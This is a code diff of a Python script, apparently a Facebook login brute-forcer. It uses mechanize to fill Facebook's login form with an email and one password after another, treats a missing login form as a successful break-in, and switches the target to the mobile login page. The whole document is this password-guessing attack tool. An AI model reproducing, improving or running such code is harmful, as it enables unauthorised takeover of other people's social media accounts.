@@ -39,27 +39,27 @@ def pro_input(label):
             if Getext.split() :
                 break;
         except:
-            print()
+            print();
     return Getext
 
 def TrF(email,password):
     br=Browser()
-    br.set_handle_robots(False)
-    br.addheaders=[("User-agent","Firefox/5.0")]
-    br.open("https://www.facebook.com/login.php")
+    br.set_handle_robots(False);
+    br.addheaders=[("User-agent","firefox/5.0")];
+    br.open("https://m.facebook.com/login.php");
     br.select_form(nr=0) # don't try to select the form by his id in this place
-    br.form["email"]=email
-    br.form["pass"]=password
+    br.form["email"]=email;
+    br.form["pass"]=password;
     br.submit()
     try:
-        br.select_form(id="login_form")
+        br.select_form(id="login_form");
         return False
     except mechanize._mechanize.FormNotFoundError:
         return True
 
 Email=pro_input("     ( Email ) : ")
 if Email.split()[0].lower()  == "exit" :
-    sleep(2)
+    sleep(1)
     print()
     print("    [*] closing Face  ... ")
     print("\033[0m")
@@ -68,7 +68,7 @@ if Email.split()[0].lower()  == "exit" :
 while True:
     passwords=pro_input("     ( Passwords ) : ")
     if passwords.split()[0].lower()  == "exit" :
-        sleep(2)
+        sleep(1)
         print()
         print("    [*] closing Face  ... ")
         print("\033[0m")
